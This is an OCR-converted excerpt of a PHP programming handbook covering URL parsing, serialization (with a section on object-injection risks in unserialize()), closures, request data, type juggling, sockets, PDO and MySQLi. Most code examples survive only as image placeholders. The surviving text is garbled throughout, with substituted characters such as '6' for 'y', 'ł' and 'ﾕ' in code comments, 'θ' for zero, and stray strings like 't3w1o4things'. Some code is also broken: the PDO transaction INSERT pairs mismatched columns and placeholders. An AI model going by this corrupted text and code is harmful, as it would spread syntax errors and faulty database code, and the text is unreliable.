You can use the header() function to instruct the browser to redirect to a different URL:

![](image_rsrcMTT.jpg)

You can also redirect to a relative URL (this is not part of the official HTTP specification, but it does work in all browsers):

![](image_rsrcMTU.jpg)

If headers have been sent, you can alternatively send a meta refresh HTML tag.

WARNING: The meta refresh tag relies on HTML being properly processed by the client, and some will not do this. In general, it only works in web browsers. Also, consider that if headers have been sent, you may have a bug and this should trigger an exception.

You may also print a link for users to click, for clients that ignore the meta refresh tag:

![](image_rsrcMTV.jpg)

![](image_rsrcMTW.jpg)

285

Chapter 51: How to break down an URL

As you code PHP you will most likely get your self in a position where you need to break down an URL into several pieces. There's obviously more than one way of doing it depending on your needs. This article will explain those ways for you so you can find what works best for you.

![](image_rsrcKNA.jpg)Section 51.1: Using parse\_url()

parse\_url(): This function parses a URL and returns an associative array containing any of the various components of the URL that are present.

![](image_rsrcMTX.jpg)

If you need the path separated you can use explode

![](image_rsrcMTY.jpg)

If you need the last part of the section you can use end() like this:

![](image_rsrcMTZ.jpg)

If the URL contains GET vars you can retrieve those as well

![](image_rsrcMU0.jpg)

![](image_rsrcMU1.jpg)

If you wish to break down the query vars you can use parse\_str() like this:

![](image_rsrcMU2.jpg)

![](image_rsrcKNA.jpg)Section 51.2: Using explode()

explode(): Returns an array of strings, each of which is a substring of string formed by splitting it on boundaries formed by the string delimiter.

This function is pretty much straight forward.

![](image_rsrcMU3.jpg)

You can retrieve the last part of the URL by doing this:

![](image_rsrcMU4.jpg)

You can also navigate inside the array by using sizeof() in combination with a math operator like this:

![](image_rsrcMU5.jpg)

![](image_rsrcKNA.jpg)Section 51.3: Using basename()

basename(): Given a string containing the path to a file or directory, this function will return the trailing name component.

This function will return only the last part of an URL

![](image_rsrcMU6.jpg)

![](image_rsrcMU7.jpg)

If your URL has more stuff to it and what you need is the dir name containing the file you can use it with dirname() like this:

![](image_rsrcMU8.jpg)

288

Chapter 52: Object Serialization

Section 52.1: Serialize / Unserialize

serialize() returns a string containing a byte-stream representation of any value that can be stored in PHP.

unserialize() can use this string to recreate the original variable values. To serialize an object

![](image_rsrcMU9.jpg)

To Unserialize an object

![](image_rsrcMUA.jpg)

Example

![](image_rsrcMUB.jpg)

Section 52.2: The Serializable interface

Introduction

![](image_rsrcMUC.jpg)Classes that implement this interface no longer support  sleep() and  wakeup(). The method serialize is called whenever an instance needs to be serialized. This does not invoke  destruct() or has any other side effect unless programmed inside the method. When the data is unserialized the class is known and the appropriate unserialize() method is called as a constructor instead of calling

 construct(). If you need to execute the standard constructor you may do so in the method.

Basic usage

![](image_rsrcMUD.jpg)

![](image_rsrcMUE.jpg)

Chapter 53: Serialization

Parameter​Details

The value to be serialized. serialize() handles all types, except the resource\-type. You can even serialize() arrays that contain references to itself. Circular references inside the array/object you are serializing will also be stored. Any other reference will be lost. When serializing objects, PHP will

![](image_rsrcMUF.jpg)

value​attempt to call the member function sleep() prior to serialization. This is to allow the object to do any last minute clean-up, etc. prior to being serialized. Likewise, when the object is restored using unserialize() the wakeup() member function is called. Object's private members have the class name

![](image_rsrcMUG.jpg)

prepended to the member name; protected members have a '\*' prepended to the member name. These prepended values have null bytes on either side.

Section 53.1: Serialization of different t6pes

Generates a storable representation of a value.

This is useful for storing or passing PHP values around without losing their type and structure. To make the serialized string into a PHP value again, use unserialize().

![](image_rsrcMUH.jpg)Serializing a string

Serializing a double

![](image_rsrcMUJ.jpg)

Serializing a float

![](image_rsrcMUK.jpg)

Float get serialized as doubles. Serializing an integer

![](image_rsrcMUM.jpg)Serializing a boolean

Serializing null

![](image_rsrcMUN.jpg)

![](image_rsrcMUP.jpg)Serializing an array

Serializing an object

You can also serialize Objects.

![](image_rsrcMUR.jpg)![](image_rsrcMUR.jpg)When serializing objects, PHP will attempt to call the member function sleep() prior to serialization. This is to allow the object to do any last minute clean-up, etc. prior to being serialized. Likewise, when the object is restored using unserialize() the wakeup() member function is called.

![](image_rsrcMUS.jpg)

Note that Closures cannot be serialized:

![](image_rsrcMUT.jpg)

Section 53.2: Securit6 Issues with unserialize

Using unserialize function to unserialize data from user input can be dangerous.

![](image_rsrcMUU.jpg)A Warning from php.net

Warning Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json\_decode() and json\_encode()) if you need to pass serialized data to the user.

Possible Attacks

![](image_rsrcMUV.jpg)PHP Object Injection

PHP Object Injection

PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.

In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:

![](image_rsrcMUW.jpg)The application must have a class which implements a PHP magic method (such as  wakeup or  destruct) that can be used to carry out malicious attacks, or to start a "POP chain".

![](image_rsrcMUX.jpg)All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.

Example 1 - Path Traversal Attack

The example below shows a PHP class with an exploitable  destruct method:

![](image_rsrcMUY.jpg)

In this example an attacker might be able to delete an arbitrary file via a Path Traversal attack, for e.g. requesting the following URL:

![](image_rsrcMUZ.jpg)

Example 2 - Code Injection attack

The example below shows a PHP class with an exploitable  wakeup method:

![](image_rsrcMV0.jpg)

In this example an attacker might be able to perform a Code Injection attack by sending an HTTP request like this:

![](image_rsrcMV1.jpg)

Where the cookie parameter "data" has been generated by the following script:

![](image_rsrcMV2.jpg)

Chapter 54: Closure

Section 54.1: Basic usage of a closure

A closure is the PHP equivalent of an anonymous function, eg. a function that does not have a name. Even if that is technically not correct, the behavior of a closure remains the same as a function's, with a few extra features.

A closure is nothing but an object of the Closure class which is created by declaring a function without a name. For example:

![](image_rsrcMV3.jpg)

Keep in mind that $myClosure is an instance of Closure so that you are aware of what you can truly do with it (cf. [http://fr2.php.net/manual/en/class.closure.php](http://fr2.php.net/manual/en/class.closure.php) )

The classic case you would need a Closure is when you have to give a callable to a function, for instance usort.

Here is an example where an array is sorted by the number of siblings of each person:

![](image_rsrcMV4.jpg)

Section 54.2: Using external variables

It is possible, inside a closure, to use an external variable with the special keyword use. For instance:

![](image_rsrcMV5.jpg)

![](image_rsrcMV6.jpg)

You can go further by creating "dynamic" closures. It is possible to create a function that returns a specific calculator, depending on the quantity you want to add. For example:

![](image_rsrcMV7.jpg)

Section 54.3: Basic closure binding

As seen previously, a closure is nothing but an instance of the Closure class, and different methods can be invoked on them. One of them is bindTo, which, given a closure, will return a new one that is bound to a given object. For example:

![](image_rsrcMV8.jpg)

Section 54.4: Closure binding and scope

Let's consider this example:

![](image_rsrcMV9.jpg)

![](image_rsrcMVA.jpg)

Try to change the property visibility to either protected or private. You get a fatal error indicating that you do not have access to this property. Indeed, even if the closure has been bound to the object, the scope in which the closure is invoked is not the one needed to have that access. That is what the second argument of bindTo is for.

The only way for a property to be accessed if it's private is that it is accessed from a scope that allows it, ie. the class's scope. In the just previous code example, the scope has not been specified, which means that the closure has been invoked in the same scope as the one used where the closure has been created. Let's change that:

![](image_rsrcMVB.jpg)

As just said, if this second parameter is not used, the closure is invoked in the same context as the one used where the closure has been created. For example, a closure created inside a method's class which is invoked in an object context will have the same scope as the method's:

![](image_rsrcMVC.jpg)

![](image_rsrcMVD.jpg)

Section 54.5: Binding a closure for one call

Since PHP7, it is possible to bind a closure just for one call, thanks to the call method. For instance:

![](image_rsrcMVE.jpg)

As opposed to the bindTo method, there is no scope to worry about. The scope used for this call is the same as the one used when accessing or invoking a property of $myInstance.

Section 54.6: Use closures to implement observer pattern

In general, an observer is a class with a specific method being called when an action on the observed object occurs. In certain situations, closures can be enough to implement the observer design pattern.

Here is a detailed example of such an implementation. Let's first declare a class whose purpose is to notify observers when its property is changed.

![](image_rsrcMVF.jpg)

![](image_rsrcMVG.jpg)

Then, let's declare the class that will represent the different observers.

![](image_rsrcMVH.jpg)

Let's finally test this:

![](image_rsrcMVJ.jpg)

![](image_rsrcMVK.jpg)

Note that this example works because the observers share the same nature (they are both "named observers.")

300

Chapter 55: Reading Request Data

Section 55.1: Reading raw POST data

Usually data sent in a POST request is structured key/value pairs with a MIME type of application/x\-www\-form\- urlencoded. However many applications such as web services require raw data, often in XML or JSON format, to be sent instead. This data can be read using one of two methods.

php://input is a stream that provides access to the raw request body.

![](image_rsrcMVM.jpg)

Version < 5.6

‡HTTP\_RAW\_POST\_DATA is a global variable that contains the raw POST data. It is only available if the

always\_populate\_raw\_post\_data directive in php.ini is enabled.

![](image_rsrcMVN.jpg)

This variable has been deprecated since PHP version 5.6, and was removed in PHP 7.0.

Note that neither of these methods are available when the content type is set to multipart/form\-data, which is used for file uploads.

Section 55.2: Reading POST data

Data from a POST request is stored in the superglobal $\_POST in the form of an associative array.

Note that accessing a non-existent array item generates a notice, so existence should always be checked with the

![](image_rsrcMVP.jpg)isset() or empty() functions, or the null coalesce operator. Example:

Version ≥ 7.0

![](image_rsrcMVR.jpg)

Section 55.3: Reading GET data

Data from a GET request is stored in the superglobal $\_GET in the form of an associative array.

Note that accessing a non-existent array item generates a notice, so existence should always be checked with the

![](image_rsrcMVS.jpg)isset() or empty() functions, or the null coalesce operator. Example: (for URL /topics.php?author\=alice&topic\=ph3p0) 1

![](image_rsrcMVT.jpg)

Version ≥ 7.0

![](image_rsrcMVU.jpg)

Section 55.4: Handling file upload errors

The $\_FILES\["FILE\_NAME"\]\['error'\] (where "FILE\_NAME" is the value of the name attribute of the file input, present in your form) might contain one of the following values:

1.  UPLOAD\_ERR\_OK \- There is no error, the file uploaded with success.

2.  UPLOAD\_ERR\_INI\_SIZE \- The uploaded file exceeds the upload\_max\_filesize directive in php.ini.

3.  UPLOAD\_ERR\_PARTIAL \- The uploaded file exceeds the MAX\_FILE\_SIZE directive that was specified in the HTML form.

4.  UPLOAD\_ERR\_NO\_FILE \- No file was uploaded.

5.  UPLOAD\_ERR\_NO\_TMP\_DIR \- Missing a temporary folder. (From PHP 5.0.3).

6.  UPLOAD\_ERR\_CANT\_WRITE \- Failed to write file to disk. (From PHP 5.1.0).

7.  UPLOAD\_ERR\_EXTENSION \- A PHP extension stopped the file upload. (From PHP 5.2.0).

An basic way to check for the errors, is as follows:

![](image_rsrcMVV.jpg)

Section 55.5: Passing arra6s b6 POST

Usually, an HTML form element submitted to PHP results in a single value. For example:

![](image_rsrcMVW.jpg)

![](image_rsrcMVX.jpg)

This results in the following output:

![](image_rsrcMVY.jpg)

However, there may be cases where you want to pass an array of values. This can be done by adding a PHP-like suffix to the name of the HTML elements:

![](image_rsrcMVZ.jpg)

This results in the following output:

![](image_rsrcMW0.jpg)

You can also specify the array indices, as either numbers or strings:

![](image_rsrcMW1.jpg)

Which returns this output:

![](image_rsrcMW2.jpg)

This technique can be used to avoid post-processing loops over the $\_POST array, making your code leaner and more concise.

Section 55.6: Uploading files with HTTP PUT

PHP provides support for the HTTP PUT method used by some clients to store files on a server. PUT requests are much simpler than a file upload using POST requests and they look something like this:

![](image_rsrcMW3.jpg)

Into your PHP code you would then do something like this:

![](image_rsrcMW4.jpg)

Also here you can read interesting SO question/answers about receiving file via HTTP PUT.

Chapter 56: T6pe juggling and Non-Strict Comparison Issues

Section 56.1: What is T6pe Juggling?

PHP is a loosely typed language. This means that, by default, it doesn't require operands in an expression to be of the same (or compatible) types. For example, you can append a number to a string and expect it to work.

![](image_rsrcMW5.jpg)

![](image_rsrcKH6.jpg)The output will be:

string(24) "This is example number 1"

PHP accomplishes this by automatically casting incompatible variable types into types that allow the requested operation to take place. In the case above, it will cast the integer literal 1 into a string, meaning that it can be concatenated onto the preceding string literal. This is referred to as type juggling. This is a very powerful feature of PHP, but it is also a feature that can lead you to a lot of hair-pulling if you are not aware of it, and can even lead to security problems.

Consider the following:

![](image_rsrcMW6.jpg)

The intent appears to be that the programmer is checking that a variable has a value of 1. But what happens if

$variable has a value of "1 and a half" instead? The answer might surprise you.

![](image_rsrcMW7.jpg)

![](image_rsrcKH6.jpg)The result is:

bool(true)

Why has this happened? It's because PHP realised that the string "1 and a half" isn't an integer, but it needs to be in order to compare it to integer 1. Instead of failing, PHP initiates type juggling and, attempts to convert the variable into an integer. It does this by taking all the characters at the start of the string that can be cast to integer and casting them. It stops as soon as it encounters a character that can't be treated as a number. Therefore "1 and a half" gets cast to integer 1.

Granted, this is a very contrived example, but it serves to demonstrate the issue. The next few examples will cover some cases where I've run into errors caused by type juggling that happened in real software.

Section 56.2: Reading from a file

When reading from a file, we want to be able to know when we've reached the end of that file. Knowing that

fgets() returns false at the end of the file, we might use this as the condition for a loop. However, if the data

returned from the last read happens to be something that evaluates as boolean false, it can cause our file read loop to terminate prematurely.

![](image_rsrcMW8.jpg)

If the file being read contains a blank line, the while loop will be terminated at that point, because the empty string evaluates as boolean false.

Instead, we can check for the boolean false value explicitly, using strict equality operators:

![](image_rsrcMW9.jpg)

Note this is a contrived example; in real life we would use the following loop:

![](image_rsrcMWA.jpg)

Or replace the whole thing with:

![](image_rsrcMWB.jpg)

Section 56.3: Switch surprises

Switch statements use non-strict comparison to determine matches. This can lead to some nasty surprises. For example, consider the following statement:

![](image_rsrcMWC.jpg)

This is a very simple statement, and works as expected when $name is a string, but can cause problems otherwise.

value in the case statement that gets juggled, not the condition in the switch statement. The string "input 1" is converted to integer θ which matches the input value of integer θ. The upshot of this is if you provide a value of integer θ, the first case always executes.

There are a few solutions to this problem: Explicit casting

The value can be typecast to a string before comparison:

![](image_rsrcMWD.jpg)

Or a function known to return a string can also be used:

![](image_rsrcMWE.jpg)

Both of these methods ensure the value is of the same type as the value in the case statements.

Avoid switch

Using an if statement will provide us with control over how the comparison is done, allowing us to use strict comparison operators:

![](image_rsrcMWF.jpg)

Section 56.4: Strict t6ping

Since PHP 7.0, some of the harmful effects of type juggling can be mitigated with strict typing. By including this declare statement as the first line of the file, PHP will enforce parameter type declarations and return type declarations by throwing a TypeError exception.

![](image_rsrcMWG.jpg)

For example, this code, using parameter type definitions, will throw a catchable exception of type TypeError when run:

![](image_rsrcMWH.jpg)

than an integer:

![](image_rsrcMWJ.jpg)

Chapter 57: Sockets

Section 57.1: TCP client socket

![](image_rsrcMWK.jpg)Creating a socket that uses the TCP (Transmission Control Protocol)

Make sure the socket is successfully created. The onSocketFailure function comes from Handling socket errors example in this topic.

![](image_rsrcMWM.jpg)

Connect the socket to a specified address

The second line fails gracefully if connection failed.

![](image_rsrcMWN.jpg)

Sending data to the server

The socket\_write function sends bytes through a socket. In PHP, a byte array is represented by a string, which is normally encoding-insensitive.

![](image_rsrcMWP.jpg)

Receiving data from the server

The following snippet receives some data from the server using the socket\_read function.

Passing PHP\_NORMAL\_READ as the third parameter reads until a \\r/\\n byte, and this byte is included in the return value.

Passing PHP\_BINARY\_READ, on the contrary, reads the required amount of data from the stream.

If socket\_set\_nonblock was called in prior, and PHP\_BINARY\_READ is used, socket\_read will return false immediately. Otherwise, the method blocks until enough data (to reach the length in the second parameter, or to reach a line ending) are received, or the socket is closed.

This example reads data from a supposedly IRC server.

![](image_rsrcMWR.jpg)

Closing the socket

![](image_rsrcMWS.jpg)

Section 57.2: TCP server socket

Socket creation

Create a socket that uses the TCP. It is the same as creating a client socket.

![](image_rsrcMWT.jpg)

Socket binding

Bind connections from a given network (parameter 2) for a specific port (parameter 3) to the socket.

The second parameter is usually "θ.θ.θ.θ", which accepts connection from all networks. It can also

One common cause of errors from socket\_bind is that the address specified is already bound to another process. Other processes are usually killed (usually manually to prevent accidentally killing critical processes) so that the sockets would be freed.

![](image_rsrcMWU.jpg)

Set a socket to listening

Make the socket listen to incoming connections using socket\_listen. The second parameter is the maximum number of connections to allow queuing before they are accepted.

![](image_rsrcMWV.jpg)

Handling connection

A TCP server is actually a server that handles child connections. socket\_accept creates a new child connection.

![](image_rsrcMWW.jpg)

Data transferring for a connection from socket\_accept is the same as that for a TCP client socket.

When this connection should be closed, call socket\_close($conn); directly. This will not affect the original TCP server socket.

Closing the server

On the other hand, socket\_close($socket); should be called when the server is no longer used. This will free the TCP address as well, allowing other processes to bind to the address.

Section 57.3: UDP server socket

A UDP (user datagram protocol) server, unlike TCP, is not stream-based. It is packet-based, i.e. a client sends data in units called "packets" to the server, and the client identifies clients by their address. There is no builtin function that relates different packets sent from the same client (unlike TCP, where data from the same client are handled by a specific resource created by socket\_accept). It can be thought as a new TCP connection is accepted and closed every time a UDP packet arrives.

![](image_rsrcMWX.jpg)Creating a UDP server socket

The parameters are same as that for a TCP server.

![](image_rsrcMWY.jpg)

Sending a packet

This line sends $data in a UDP packet to $address:$port.

![](image_rsrcMWZ.jpg)

Receiving a packet

The following snippet attempts to manage UDP packets in a client-indexed manner.

![](image_rsrcMX0.jpg)

Closing the server

socket\_close can be used on the UDP server socket resource. This will free the UDP address, allowing other processes to bind to this address.

Section 57.4: Handling socket errors

socket\_last\_error can be used to get the error ID of the last error from the sockets extension.

socket\_strerror can be used to convert the ID to human-readable strings.

![](image_rsrcMX1.jpg)

Chapter 58: PDO

The PDO (PHP Data Objects) extension allows developers to connect to numerous different types of databases and execute queries against them in a uniform, object oriented manner.

Section 58.1: Preventing SQL injection with Parameterized Queries

SQL injection is a kind of attack that allows a malicious user to modify the SQL query, adding unwanted commands to it. For example, the following code is vulnerable:

![](image_rsrcMX2.jpg)

This allows any user of this script to modify our database basically at will. For example consider the following query string:

![](image_rsrcMX3.jpg)

This makes our example query look like this

![](image_rsrcMX4.jpg)

While this is an extreme example (most SQL injection attacks do not aim to delete data, nor do most PHP query execution functions support multi-query), this is an example of how a SQL injection attack can be made possible by the careless assembly of the query. Unfortunately, attacks like this are very common, and are highly effective due to coders who fail to take proper precautions to protect their data.

![](image_rsrcKNA.jpg)To prevent SQL injection from occurring, prepared statements are the recommended solution. Instead of concatenating user data directly to the query, a placeholder is used instead. The data is then sent separately, which means there is no chance of the SQL engine confusing user data for a set of instructions.

While the topic here is PDO, please note that the PHP MySQLi extension also supports prepared statements

PDO supports two kinds of placeholders (placeholders cannot be used for column or table names, only values):

1.  Named placeholders. A colon(:), followed by a distinct name (eg. :user)

![](image_rsrcMX5.jpg)

2.  Traditional SQL positional placeholders, represented as ?:

![](image_rsrcMX6.jpg)

![](image_rsrcMX7.jpg)

If ever you need to dynamically change table or column names, know that this is at your own security risks and a bad practice. Though, it can be done by string concatenation. One way to improve security of such queries is to set a table of allowed values and compare the value you want to concatenate to this table.

![](image_rsrcMX8.jpg)Be aware that it is important to set connection charset through DSN only, otherwise your application could be prone to an obscure vulnerability if some odd encoding is used. For PDO versions prior to 5.3.6 setting charset through DSN is not available and thus the only option is to set PDO::ATTR\_EMULATE\_PREPARES attribute to false on the connection right after it s created.

![](image_rsrcMX9.jpg)

![](image_rsrcMXA.jpg)This causes PDO to use the underlying DBMS s native prepared statements instead of just emulating it.

However, be aware that PDO will silently fallback to emulating statements that MySQL cannot prepare natively: those that it can are listed in the manual (source).

Section 58.2: Basic PDO Connection and Retrieval

Since PHP 5.0, PDO has been available as a database access layer. It is database agnostic, and so the following connection example code should work for any of its supported databases simply by changing the DSN.

![](image_rsrcMXB.jpg)// Firsł, creałe łhe dałabase handﾕe

//Using MySQL (connecłion via ﾕocaﾕ sockeł):

$dsn \= "mysql:host=localhost;dbname=testdb;charset=utf8";

//Using MySQL (connecłion via nełwork, opłionaﾕﾕy you can specify łhe porł łoo):

//$dsn​\=​"mysqﾕ:hosł=127.0.0.1;porł\=3306;dbname=łesłdb;charseł\=ułf8";

//Or Posłgres

//$dsn​\=​"pgsqﾕ:hosł=ﾕocaﾕhosł;porł=5432;dbname=łesłdb;";

//Or even SQLiłe

//$dsn  \=  "sqﾕiłe:/pałh/ło/dałabase"

$username \= "user";

$password \= "pass";

$db \= new PDO($dsn, $username, $password);

// sełup PDO ło łhrow an excepłion if an invaﾕid query is provided

$db\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);

// Nexł, ﾕeł's prepare a słałemenł for execułion, wiłh a singﾕe pﾕacehoﾕder

$query \= "SELECT \* FROM users WHERE class \= ?";

$statement \= $db\->prepare($query);

// Creałe some paramełers ło fiﾕﾕ łhe pﾕacehoﾕders, and execułe łhe słałemenł

$parameters \= \[ "221B" \];

$statement\->execute($parameters);

// Now, ﾕoop łhrough each record as an associałive array

while ($row \= $statement\->fetch(PDO::FETCH\_ASSOC)) { do\_stuff($row);

}

313

The prepare function creates a PDOStatement object from the query string. The execution of the query and retrieval of the results are performed on this returned object. In case of a failure, the function either returns false or throws an exception (depending upon how the PDO connection was configured).

Section 58.3: Database Transactions with PDO

Database transactions ensure that a set of data changes will only be made permanent if every statement is successful. Any query or code failure during a transaction can be caught and you then have the option to roll back the attempted changes.

PDO provides simple methods for beginning, committing, and rollbacking back transactions.

![](image_rsrcMXC.jpg)

During a transaction any data changes made are only visible to the active connection. SELECT statements will return the altered changes even if they are not yet committed to the database.

Note: See database vendor documentation for details about transaction support. Some systems do not support transactions at all. Some support nested transactions while others do not.

Practical Example Using Transactions with PDO

In the following section is demonstrated a practical real world example where the use of transactions ensures the consistency of database.

Imagine the following scenario, let's say you are building a shopping cart for an e-commerce website and you decided to keep the orders in two database tables. One named orders with the fields order\_id, name, address, telephone and created\_at. And a second one named orders\_products with the fields order\_id, product\_id and quantity. The first table contains the metadata of the order while the second one the actual products that have been ordered.

Inserting a new order to the database

To insert a new order into the database you need to do t3w1o4things. First you need to INSERT a new record inside the

orders table that will contain the metadata of the order (name, address, etc). And then you need to INSERT one record into the orders\_products table, for each one of the products that are included in the order.

You could do this by doing something similar to the following:

![](image_rsrcMXD.jpg)// Inserł łhe meładała of łhe order inło łhe dałabase

$preparedStatement \= $db\->prepare(

'INSERT INTO \`orders\` (\`name\`, \`address\`, \`telephone\`, \`created\_at\`) VALUES (:name, :address, :telephone, :created\_at)'

);

$preparedStatement\->execute(\[ 'name' \=> $name, 'address' \=> $address, 'telephone' \=> $telephone, 'created\_at' \=> time(),

\]);

// Geł łhe generałed \`order\_id\`

$orderId \= $db\->lastInsertId();

// Consłrucł łhe query for inserłing łhe producłs of łhe order

$insertProductsQuery \= 'INSERT INTO \`orders\_products\` (\`order\_id\`, \`product\_id\`, \`quantity\`) VALUES';

$count \= θ;

foreach ( $products as $productId \=> $quantity ) {

$insertProductsQuery .= ' (:order\_id' . $count . ', :product\_id' . $count . ', :quantity' .

$count . ')';

$insertProductsParams\['order\_id' . $count\] \= $orderId;

$insertProductsParams\['product\_id' . $count\] \= $productId;

$insertProductsParams\['quantity' . $count\] \= $quantity;

++$count;

}

// Inserł łhe producłs incﾕuded in łhe order inło łhe dałabase

$preparedStatement \= $db\->prepare($insertProductsQuery);

$preparedStatement\->execute($insertProductsParams);

This will work great for inserting a new order into the database, until something unexpected happens and for some reason the second INSERT query fails. If that happens you will end up with a new order inside the orders table, which will have no products associated to it. Fortunately, the fix is very simple, all you have to do is to make the queries in the form of a single database transaction.

Inserting a new order into the database with a transaction

To start a transaction using PDO all you have to do is to call the beginTransaction method before you execute any queries to your database. Then you make any changes you want to your data by executing INSERT and / or UPDATE queries. And finally you call the commit method of the PDO object to make the changes permanent. Until you call the commit method every change you have done to your data up to this point is not yet permanent, and can be easily reverted by simply calling the rollback method of the PDO object.

On the following example is demonstrated the use of transactions for inserting a new order into the database, while ensuring the same time the consistency of the data. If one of the two queries fails all the changes will be reverted.

![](image_rsrcMXE.jpg)// In łhis exampﾕe we are using MySQL buł łhis appﾕies ło any dałabase łhał has supporł for

łransacłions

$db \= new PDO('mysql:host=' . $host . ';dbname=' . $dbname . ';charset=utf8', $username,

$password);

// Make sure łhał PDO wiﾕﾕ łhrow an excepłion in case of error ło make error handﾕing easier

$db\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);

try {

// From łhis poinł and unłiﾕ łhe łransacłion is being commiłłed every change ło łhe dałabase can be reverłed

$db\->beginTransaction();

// Inserł łhe meładała of łhe order inło łhe dałabase

$preparedStatement \= $db\->prepare(

'INSERT INTO \`orders\` (\`order\_id\`, \`name\`, \`address\`, \`created\_at\`) VALUES (:name, :address, :telephone, :created\_at)'

);

$preparedStatement\->execute(\[ 'name' \=> $name, 'address' \=> $address, 'telephone' \=> $telephone, 'created\_at' \=> time(),

\]);

// Geł łhe generałed \`order\_id\`

$orderId \= $db\->lastInsertId();

// Consłrucł łhe query for inserłing łhe producłs of łhe order

$insertProductsQuery \= 'INSERT INTO \`orders\_products\` (\`order\_id\`, \`product\_id\`, \`quantity\`) VALUES';

$count \= θ;

foreach ( $products as $productId \=> $quantity ) {

$insertProductsQuery .= ' (:order\_id' . $count . ', :product\_id' . $count . ', :quantity' .

$count . ')';

$insertProductsParams\['order\_id' . $count\] \= $orderId;

$insertProductsParams\['product\_id' . $count\] \= $productId;

$insertProductsParams\['quantity' . $count\] \= $quantity;

++$count;

}

// Inserł łhe producłs incﾕuded in łhe order inło łhe dałabase

$preparedStatement \= $db\->prepare($insertProductsQuery);

$preparedStatement\->execute($insertProductsParams);

// Make łhe changes ło łhe dałabase permanenł

$db\->commit();

}

catch ( PDOException $e ) {

// Faiﾕed ło inserł łhe order inło łhe dałabase so we roﾕﾕback any changes

$db\->rollback();

throw $e;

}

Section 58.4: PDO: connecting to M6SQL/MariaDB server

There are two ways to connect to a MySQL/MariaDB server, depending on your infrastructure.

![](image_rsrcMXF.jpg)Standard (TCP/IP) connection

Since PDO was designed to be compatible with older MySQL server versions (which did not have support for prepared statements), you have to explicitly disable the emulation. Otherwise, you will lose the added injection prevention benefits, that are usually granted by using prepared statements.

Another design compromise, that you have to keep in mind, is the default error handling behavior. If not otherwise configured, PDO will not show any indications of SQL errors.

It is strongly recommended setting it to "exception mode", because that gains you additional functionality, when writing persistence abstractions (for example: having an exception, when violating UNIQUE constraint).

![](image_rsrcMXG.jpg)Socket connection

On unix-like systems, if host name is 'localhost', then the connection to the server is made through a domain socket.

Section 58.5: PDO: Get number of affected rows b6 a quer6

We start off with $db, an instance of the PDO class. After executing a query we often want to determine the number of rows that have been affected by it. The rowCount() method of the PDOStatement will work nicely:

$query = $db->query("DELETE FROM table WHERE name = 'John'"); $count = $query->rowCount(); echo "Deleted

$count rows named John";

NOTE: This method should only be used to determine the number of rows affected by INSERT, DELETE, and UPDATE statements. Although this method may work for SELECT statements as well, it is not consistent across all databases.

Section 58.6: PDO::lastInsertId()

You may often find the need to get the auto incremented ID value for a row that you have just inserted into your database table. You can achieve this with the lastInsertId() method.

![](image_rsrcMXH.jpg)

![](image_rsrcMXJ.jpg)

In postgresql and oracle, there is the RETURNING Keyword, which returns the specified columns of the currently inserted / modified rows. Here example for inserting one entry:

![](image_rsrcMXK.jpg)

Chapter 59: PHP M6SQLi

The mysqli interface is an improvement (it means "MySQL Improvement extension") of the mysql interface, which was deprecated in version 5.5 and is removed in version 7.0. The mysqli extension, or as it is sometimes known, the MySQL improved extension, was developed to take advantage of new features found in MySQL systems versions

4.1.3 and newer. The mysqli extension is included with PHP versions 5 and later.

Section 59.1: Close connection

![](image_rsrcMXM.jpg)

When we are finished querying the database, it is recommended to close the connection to free up resources. Object oriented style

Procedural style

![](image_rsrcMXN.jpg)

Note: The connection to the server will be closed as soon as the execution of the script ends, unless it's closed earlier by explicitly calling the close connection function.

Use Case: If our script has a fair amount of processing to perform after fetching the result and has retrieved the full result set, we definitely should close the connection. If we were not to, there's a chance the MySQL server will reach its connection limit when the web server is under heavy use.

Section 59.2: M6SQLi connect

![](image_rsrcMXP.jpg)

Object oriented style Connect to Server

Set the default database: $conn\->select\_db("my\_db");

Connect to Database

![](image_rsrcMXR.jpg)

Procedural style Connect to Server

![](image_rsrcMXS.jpg)

Set the default database: mysqli\_select\_db($conn, "my\_db");

Connect to Database

![](image_rsrcMXT.jpg)

Object oriented style

![](image_rsrcMXU.jpg)

Procedural style

![](image_rsrcMXV.jpg)

Section 59.3: Loop through M6SQLi results

PHP makes it easy to get data from your results and loop over it using a while statement. When it fails to get the next row, it returns false, and your loop ends. These examples work with

![](image_rsrcMXW.jpg)![](image_rsrcMXX.jpg)mysqli\_fetch\_assoc \- Associative array with column names as keys mysqli\_fetch\_object \- stdClass object with column names as variables

![](image_rsrcMXY.jpg)![](image_rsrcMXZ.jpg)mysqli\_fetch\_array \- Associative AND Numeric array (can use arguments to get one or the other) mysqli\_fetch\_row \- Numeric array

Object oriented style

![](image_rsrcMY0.jpg)

Procedural style

![](image_rsrcMY1.jpg)

To get exact information from results, we can use:

![](image_rsrcMY2.jpg)

Section 59.4: Prepared statements in M6SQLi

Please read Preventing SQL injection with Parametrized Queries for a complete discussion of why prepared statements help you secure your SQL statements from SQL Injection attacks

The $conn variable here is a MySQLi object. See MySQLi connect example for more details.

For both examples, we assume that $sql is

![](image_rsrcMY3.jpg)

The ? represents the values we will provide later. Please note that we do not need quotes for the placeholders, regardless of the type. We can also only provide placeholders in the data portions of the query, meaning SET, VALUES and WHERE. You cannot use placeholders in the SELECT or FROM portions.

Object oriented style

![](image_rsrcMY4.jpg)

Procedural style

![](image_rsrcMY5.jpg)

The first parameter of $stmt\->bind\_param or the second parameter of mysqli\_stmt\_bind\_param is determined by the data type of the corresponding parameter in the SQL query:

Parameter Data type of the bound parameter

i​integer

d​double

s​string

b​blob

![](image_rsrcMY6.jpg)Your list of parameters needs to be in the order provided in your query. In this example si means the first parameter (coﾕumn\_2 \= ?) is string and the second parameter (coﾕumn\_3 \> ?) is integer.

For retrieving data, see How to get data from a prepared statement

Section 59.5: Escaping Strings

